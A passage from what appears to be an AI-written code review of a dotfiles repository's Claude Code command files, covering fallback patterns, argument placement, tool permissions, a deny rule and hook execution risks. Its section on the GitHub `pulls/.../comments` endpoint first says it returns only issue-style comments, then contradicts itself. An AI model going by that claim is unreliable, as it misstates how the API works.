command substitution. At minimum, change the outer `2>/dev/null` to a fallback with an error message like the pattern used in `ci-fix.md` line 16:\n```\n|| echo \"レビューコメントを取得できません\"\n```\n\n---\n\n### 3. Fallback Pattern Consistency (`2>/dev/null || fallback`)\n\n**Severity: Medium**\n**Files: Multiple command files**\n\nThree different fallback patterns are used:\n\n| Pattern | Used in |\n|---------|---------|\n| `2>/dev/null \\|\\| gh pr ... ` (fallback to no-arg version) | `pr-fix.md`, `pr-review.md` |\n| `2>/dev/null \\|\\| echo \"...\"` (fallback to message) | `ci-fix.md` (line 16) |\n| `2>/dev/null` only (silent failure) | `pr-fix.md` (line 19, the `gh api` call) |\n| No fallback at all | `commit.md`, `commit-split.md`, `test-create.md`, `review-diff.md`, `pr-zero.md` |\n\nThe commands that take no `$0` argument (`commit.md`, `ci-fix.md`, `review-diff.md`, `pr-zero.md`) reasonably have no fallback since there is no optional parameter. However, `test-create.md` line 18 uses:\n```\n!`git diff --name-only HEAD 2>/dev/null; git diff --name-only --cached 2>/dev/null`\n```\nThis uses `;` (unconditional sequential) rather than `||` (conditional fallback), which is actually correct here since both commands should run. This is fine.\n\nThe inconsistency is specifically that `pr-fix.md` line 19 silently swallows errors with just `2>/dev/null` while all other PR-related commands provide a fallback. This should be addressed.\n\n---\n\n### 4. `$ARGUMENTS` Placement Consistency\n\n**Severity: Low**\n**Files: `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md` (line 21), `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md` (line 23), `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 24)**\n\nThree files use `$ARGUMENTS`:\n- `test-create.md` line 21: `指定ファイル ($ARGUMENTS) を対象にする` -- embedded in a sentence within the procedure steps\n- `review-diff.md` line 23: `指定された対象: $ARGUMENTS（省略時は全変更）` -- standalone section under `## 対象`\n- `pr-zero.md` line 24: `$ARGUMENTS` -- standalone, bare, under `## オプション`\n\nThe placement approach differs across files. `review-diff.md` provides the best pattern because it clearly labels the argument and describes the fallback behavior. `pr-zero.md`'s bare `$ARGUMENTS` under `## オプション` provides no context about what the argument means.\n\n**Recommendation:** Standardize to the `review-diff.md` pattern, e.g., in `pr-zero.md`:\n```markdown\n## オプション\n指定されたオプション: $ARGUMENTS（省略時はオプションなし）\n```\n\n---\n\n### 5. `allowed-tools` Alignment with Actual Needs\n\n**Severity: Medium**\n\n#### 5a. `commit.md` and `commit-split.md` -- `Bash(git *)`\n\nThese use the broad `Bash(git *)` wildcard. However, both files explicitly prohibit `git checkout`, `git restore`, `git reset`, `git stash`. The `allowed-tools` wildcard still permits these commands, relying solely on the instruction text to prevent their use.\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/commit.md`, line 3**\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md`, line 4**\n\n**Recommendation:** This is acceptable since `allowed-tools` is a permission grant, not a restriction, and the instructions provide the behavioral constraint. No action required but worth noting.\n\n#### 5b. `pr-fix.md` -- Missing `Bash(gh run view *)`\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 4**\n\nThe command fixes CI errors but only has `Bash(gh pr *)` for CI checks. To investigate CI failure logs in detail, `Bash(gh run view *)` and `Bash(gh run list *)` may be needed. The `ci-fix.md` also lacks `Bash(gh run view *)`.\n\n**Recommendation:** Consider adding `Bash(gh run view *)` to both `pr-fix.md` and `ci-fix.md` if CI log inspection is needed.\n\n#### 5c. `pr-fix.md` -- Has `Bash(gh api *)` but no other command has it\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 4**\n\nOnly `pr-fix.md` includes `Bash(gh api *)`. This is needed for the review comments fetch on line 19. However, `pr-review.md` does NOT include `Bash(gh api *)` even though it might benefit from accessing review comments through the API.\n\n**Recommendation:** Verify whether `pr-review.md` needs `Bash(gh api *)` for fetching review comments, or if it intentionally relies only on `gh pr view` data.\n\n#### 5d. `pr-review.md` -- Missing `Bash(gh issue view *)`\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md`, line 4**\n\nThe `pr-compliance-review` skill (which `pr-review.md` uses via the `code-reviewer` subagent) requires `gh issue view` to fetch linked GitHub Issues. However, `pr-review.md`'s `allowed-tools` does not include `Bash(gh issue view *)`. This may cause the subagent to fail when performing PR compliance checks.\n\n**Recommendation:** Add `Bash(gh issue view *)` to `pr-review.md`'s `allowed-tools` if the subagent inherits the parent command's tool permissions.\n\n#### 5e. `ci-fix.md` -- Missing `Bash(gh pr view *)`\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md`, line 3**\n\n`ci-fix.md` uses `gh pr checks` in its dynamic context injection but only has `Bash(gh pr checks *)` in allowed-tools. If the agent needs to view PR details during debugging, `Bash(gh pr view *)` would be needed.\n\n#### 5f. `review-diff.md` -- Has specific subcommand patterns\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md`, line 4**\n\nThis file uses specific patterns like `Bash(git status *)` and `Bash(git diff *)` instead of the broad `Bash(git *)` used by `commit.md`. This is more restrictive and precise, which is better security practice, but inconsistent with other files.\n\n---\n\n### 6. Security: `settings.json` Deny Rules\n\n**Severity: Low**\n**File: `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json`, lines 116-118**\n\n```json\n\"deny\": [\n  \"Read(./.entire/metadata/**)\"\n]\n```\n\nThe deny rule uses a relative path (`./`). This should work correctly as Claude Code resolves paths relative to the project root. However, the `.entire/` directory appears in the git status as untracked (`?? .entire/`), suggesting it is a new addition. The deny rule prevents reading metadata from this directory, which is appropriate for protecting internal plugin/tool metadata.\n\nNo issue found.\n\n---\n\n### 7. Security: `settings.json` Hooks -- External Command Execution\n\n**Severity: Medium**\n**File: `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json`, lines 7-82**\n\nAll hooks execute `entire hooks claude-code <event>` commands. The `entire` command appears to be an external CLI tool. Points to note:\n\n- If the `entire` binary is compromised or replaced, all hook events (session start/end, stop, user prompt submit, pre/post task, post todo) would execute malicious code.\n- The hooks fire on every user interaction (`UserPromptSubmit`), which means high-frequency execution.\n- There is no path qualification for the `entire` command (e.g., `/usr/local/bin/entire`), so it relies on `$PATH` resolution.\n\n**Recommendation:** This is acceptable for a personal dotfiles repository where the user controls the environment. For shared/team usage, consider using absolute paths.\n\n---\n\n### 8. `pr-fix.md` `gh api` Command Resolution\n\n**Severity: High**\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 19**\n\n```\ngh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments\n```\n\n**Analysis:**\n- `gh repo view --json nameWithOwner -q .nameWithOwner` returns `owner/repo` format, which is correct for the GitHub API path.\n- `gh pr view $0 --json number -q .number` returns just the number.\n- The full path becomes `repos/owner/repo/pulls/123/comments` which is the correct GitHub REST API endpoint.\n\n**However, this endpoint returns only issue-style comments on the PR, NOT review comments.** The correct endpoints for review comments are:\n- `pulls/{pull_number}/reviews` -- for review summaries\n- `pulls/{pull_number}/comments` -- for **review line comments** (inline comments)\n\nIf the intent is to fetch inline review comments (code review suggestions), then `/pulls/.../comments` is correct.
